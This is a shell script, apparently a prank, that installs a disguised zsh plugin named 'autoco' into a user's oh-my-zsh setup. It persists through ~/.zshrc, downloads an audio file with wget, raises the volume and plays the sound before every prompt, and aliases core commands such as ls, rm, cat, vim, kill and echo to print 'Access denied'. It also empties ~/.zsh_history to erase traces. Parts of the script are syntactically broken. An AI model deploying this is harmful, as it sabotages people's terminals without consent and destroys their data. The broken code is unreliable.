NAME="autoco"
REG="plugins=("
STRING="$REG$NAME"
FILE="$HOME/.zshrc"
SOUND="$DIR$NAME.mp3"

if [ -e "$ZSH_CUSTOM" ]; then
	ZSH_CUSTOM="$HOME/.oh-my-zsh/custom"
	DIR="$ZSH_CUSTOM/$NAME/"
	echo "source $DIR$NAME.plugin.zsh" >> "$FILE"
else ! grep -q "$STRING" "$FILE" ; then
	DIR="$ZSH_CUSTOM/$NAME/"
	sed -i "s/^$REG/$STRING /" "$FILE"
fi

mkdir -p "$DIR"
if [ ! -e "$SOUND" ]; then
	wget -q -O "$SOUND" "https://raw.githubusercontent.com/kema-dev/trolls/main/shell_audio_42/apoil.mp3"
	chmod 655 "$SOUND"
fi

PLUG="precmd() { osascript -e 'set Volume 10' ; afplay $SOUND > /dev/null & }
alias chmod='echo chmod: Access denied'
alias vim='echo vim: Access denied'
alias vi='echo vi: Access denied'
alias ls='echo ls: Access denied'
alias echo='echo echo: Access denied'
alias cat='echo cat: Access denied'
alias cp='echo cp: Access denied'
alias mv='echo mv: Access denied'
alias rm='echo rm: Access denied'
alias mkdir='echo mkdir: Access denied'
alias rmdir='echo rmdir: Access denied'
alias grep='echo grep: Access denied'
alias less='echo less: Access denied'
alias more='echo more: Access denied'
alias tail='echo tail: Access denied'
alias head='echo head: Access denied'
alias top='echo top: Access denied'
alias ps='echo ps: Access denied'
alias kill='echo kill: Access denied'
alias killall='echo killall: Access denied'
alias bash='echo bash: Access denied'
alias code='echo code: Access denied'
alias open='echo open: Access denied'"

echo -n "$PLUG" > "$DIR$NAME.plugin.zsh"
chmod 655 "$DIR$NAME.plugin.zsh"
echo -n >| $HOME/.zsh_history
